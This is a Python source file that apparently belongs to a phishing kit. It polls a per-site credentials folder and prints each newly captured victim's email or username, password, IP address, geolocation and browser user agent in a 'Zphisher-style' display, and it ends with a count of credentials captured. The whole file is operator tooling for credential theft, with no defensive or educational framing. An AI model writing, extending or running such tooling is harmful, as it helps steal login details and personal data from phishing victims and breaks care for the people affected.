import os
import time
import json
from utils import CREDENTIALS_DIR

# Color palette for clean terminal output
BOLD = '\033[1m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

def display_zphisher_style(entry, filename):
    """Print captured credentials in a clean, Zphisher-style format"""
    # SAFEGUARD: Handle accidental list files from old runs
    if isinstance(entry, list):
        if len(entry) == 0:
            return
        entry = entry[-1]  # Grab the last captured credential in the list

    data = entry.get('data', {})
    client_info = entry.get('client_info', {})
    timestamp = entry.get('timestamp', 'N/A')
    
    # Safely extract data
    email = data.get('email') or data.get('username') or data.get('user') or 'N/A'
    password = data.get('pass') or data.get('password') or data.get('passwd') or 'N/A'
    ip = client_info.get('ip', 'N/A')
    ua = client_info.get('user_agent', 'N/A')
    
    # Geo-location extraction
    geo = client_info.get('geo', {})
    location = f"{geo.get('city', 'N/A')}, {geo.get('country', 'N/A')}" if geo else 'N/A'

    # Print formatted output
    print(f"\n{BOLD}{GREEN}[+] NEW CREDENTIAL CAPTURED!{RESET}")
    print(f"    {CYAN}[*] Time   :{RESET} {timestamp}")
    print(f"    {CYAN}[*] Email  :{RESET} {email}")
    print(f"    {CYAN}[*] Pass   :{RESET} {password}")
    print(f"    {CYAN}[*] IP     :{RESET} {ip}")
    print(f"    {CYAN}[*] Loc    :{RESET} {location}")
    print(f"    {CYAN}[*] Agent  :{RESET} {ua[:80]}{'...' if len(ua) > 80 else ''}")
    print(f"    {YELLOW}[*] File   :{RESET} {filename}")

def monitor_credentials(site_name):
    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
    
    if not os.path.exists(site_dir):
        os.makedirs(site_dir, exist_ok=True)
    
    print(f"\n{BOLD}{CYAN}🔍 Monitoring for NEW credentials... (Ctrl+C to stop){RESET}")
    print(f"{YELLOW}Note: Every new capture will be printed instantly below{RESET}")
    
    processed_files = set()

    try:
        while True:
            current_files = set()
            if os.path.exists(site_dir):
                for f in os.listdir(site_dir):
                    if f.endswith('.json') and not f.startswith('index') and not f.startswith('tracking'):
                        current_files.add(f)
            
            new_files = current_files - processed_files
            
            for filename in new_files:
                filepath = os.path.join(site_dir, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        entry = json.load(f)
                    
                    # Print it (the function safely handles Lists vs Dicts now)
                    display_zphisher_style(entry, filename)
                    processed_files.add(filename)
                    
                except (json.JSONDecodeError, OSError):
                    # File is still writing. Skip for now, will try again next loop
                    pass
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⏹️  Monitoring stopped.{RESET}")
        if os.path.exists(site_dir):
            total_files = len([f for f in os.listdir(site_dir) 
                             if f.endswith('.json') and not f.startswith('index') and not f.startswith('tracking')])
            print(f"{CYAN}📊 Total credentials captured: {total_files}{RESET}")
